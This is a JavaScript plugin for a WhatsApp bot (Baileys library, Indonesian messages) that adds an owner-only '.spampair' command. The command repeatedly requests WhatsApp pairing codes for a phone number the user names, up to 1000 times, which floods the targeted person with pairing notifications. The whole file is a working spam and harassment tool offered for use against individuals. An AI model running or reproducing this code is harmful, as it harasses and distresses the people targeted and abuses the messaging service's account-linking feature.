/*created by Ar sensei
*/
import { 
    useMultiFileAuthState, 
    makeCacheableSignalKeyStore, 
    makeWASocket, 
    fetchLatestBaileysVersion 
} from '@adiwajshing/baileys';
import Pino from "pino";
import fs from "fs";

let handler = async (m, { conn, args }) => {
    if (!args[0] || !args[1]) return conn.reply(m.chat, 'EX: `.spampair 6281234567890 5`', m);

    let phoneNumber = args[0].replace(/[^0-9]/g, '');
    let spamCount = parseInt(args[1]) || 1;

    if (!phoneNumber) return conn.reply(m.chat, 'Nomor tidak valid!', m);
    if (spamCount < 1 || spamCount > 1000) return conn.reply(m.chat, 'Jumlah spam harus antara 1-1000!', m); // spam countnya ubah aja bebas

    conn.reply(m.chat, `Mulai spam pairing ke ${phoneNumber} sebanyak ${spamCount} kali...`, m);

    let authFile = `ngewe/${phoneNumber}`;
    let { state, saveCreds } = await useMultiFileAuthState(authFile);

    let config = {
        logger: Pino({ level: "fatal" }),
        printQRInTerminal: false,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, Pino({ level: "fatal" })),
        },
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        markOnlineOnConnect: true,
        generateHighQualityLinkPreview: true
    };

    let sock = makeWASocket(config);

    try {
        for (let i = 0; i < spamCount; i++) {
            await new Promise(resolve => setTimeout(resolve, 1000));
            let pairingCode = await sock.requestPairingCode(phoneNumber);
            console.log(`Pairing Code ${i + 1}: ${pairingCode}`);
        }
    } catch (error) {
        console.log(`Gagal mendapatkan pairing code:`, error.message);
        return conn.reply(m.chat, `Error: ${error.message}`, m);
    }

    conn.reply(m.chat, "Spam pairing selesai.", m);
};

handler.help = ['spampair <nomor> <jumlah>'];
handler.tags = ['owner'];
handler.command = /^spampair$/i;
handler.owner = true;

export default handler;